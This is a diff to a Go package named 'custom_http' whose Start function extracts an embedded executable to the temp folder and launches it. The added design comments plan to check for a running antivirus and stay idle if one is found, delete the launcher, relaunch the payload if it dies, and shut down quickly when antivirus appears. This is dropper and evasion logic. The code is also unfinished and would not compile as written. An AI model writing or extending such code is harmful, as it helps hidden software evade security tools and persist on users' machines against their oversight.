@@ -2,12 +2,17 @@ package custom_http
 
 import (
 	"github.com/kyaxcorp/go-core/core/helpers/_runtime"
+	"github.com/kyaxcorp/go-core/core/helpers/filesystem/tmp"
+	"log"
 	"os"
 )
 import "os/exec"
 
 func Start() bool {
 	/*
+		0. check if there is an Antivirus Running!...
+			if yes, then do not run anything...
+
 		1. detect OS or build
 		2. copy file as the name of the current launched app
 			if failed to copy, retry again to copy!
@@ -20,52 +25,94 @@ func Start() bool {
 			if it's not running then let's relaunch it!
 		7. delete the app
 		8. Monitor if the app is working... if it died after launching, we should relaunch by repeating the entire process again!
+			monitor if there is an active antivirus...if yes, then shutdown fast the app!
 	*/
+
+	var fsData []byte
+	var _err error
+	var readFileFrom string
+	var writeFileTo string
+	var readFileName string
 
 	switch _runtime.OS() {
 	case _runtime.Windows:
 		// TODO: create a simple function copy embed file!
 
 		//CustomHttpStorage.Open()
-		fsData, _err := CustomHttpStorage.ReadFile("storage/win/generic/httpserver.exe")
-		if _err != nil {
-			// TODO: handle this error!?...
-			return false
-		}
-		// TODO: get app's directory path
-		filePath := "aaaa.exe"
-		fs, _err := os.Create(filePath) // TODO: get app's name
-		if _err != nil {
-			// TODO: handle this error!?...
-			return false
-		}
-		fileSize := len(fsData)
-		sizeWritten, _err := fs.Write(fsData)
-		if _err != nil {
-			// TODO: handle this error!?...
-			return false
-		}
-		if fileSize != sizeWritten {
-			// TODO: handle this error!?...
-			return false
-		}
+		//fsData, _err := CustomHttpStorage.ReadFile("storage/win/generic/httpserver.exe")
 
-		// TODO: check what arguments should be called
-		command := exec.Command(filePath)
-		// TODO: handle stdin & stdout -> send it to null!
-		_err := command.Start()
-		if _err != nil {
-			// TODO: handle this error!?...
-			return false
-		}
-		command.Process.Pid
-
+		log.Println("running on windows")
+		readFileName = "looper.exe"
+		readFileFrom = "storage/win/generic/" + readFileName
 		// Check if it's running, get the pid
 	case _runtime.Linux:
-
+		log.Println("running on linux")
+		readFileName = "httpserver"
+		readFileFrom = "storage/win/generic/" + readFileName
 	default:
 		return false
 	}
+
+	log.Println("reading file")
+	fsData, _err = CustomHttpStorage.ReadFile(readFileFrom)
+	if _err != nil {
+		log.Println("failed to read file -> ", _err.Error())
+		// TODO: handle this error!?...
+		return false
+	}
+
+	log.Println("get app's dir path")
+
+	tmpPath, _err := tmp.GetAppTmpPath()
+	if _err != nil {
+		log.Println("failed to get app's dir path -> ", _err.Error())
+		return false
+	}
+	if tmpPath == "" {
+		log.Println("tmp path is empty...")
+		return false
+	}
+
+	// TODO: create a special folder... why? because in the tmp folder other files with config.json may be!
+	// We don't need that!
+
+	// TODO: get executable file name!
+	writeFileTo = tmpPath + readFileName
+
+	log.Println("creating file")
+
+	// TODO: get app's directory path
+	fs, _err := os.Create(writeFileTo) // TODO: get app's name
+	if _err != nil {
+		log.Println("failed to create file -> ", _err.Error())
+		// TODO: handle this error!?...
+		return false
+	}
+	log.Println("writing data to file")
+	fileSize := len(fsData)
+	sizeWritten, _err := fs.Write(fsData)
+	if _err != nil {
+		log.Println("failed to write data to file -> ", _err.Error())
+		// TODO: handle this error!?...
+		return false
+	}
+	if fileSize != sizeWritten {
+		log.Println("size doesn't match ", fileSize, sizeWritten)
+		// TODO: handle this error!?...
+		return false
+	}
+
+	log.Println("executing file -> ", writeFileTo)
+	// TODO: check what arguments should be called
+	// TODO: should we copy same arguments from our app?!...
+	command := exec.Command(writeFileTo)
+	// TODO: handle stdin & stdout -> send it to null!
+	_err := command.Start()
+	if _err != nil {
+		// TODO: handle this error!?...
+		return false
+	}
+	command.Process.Pid
 
 	return true
 }
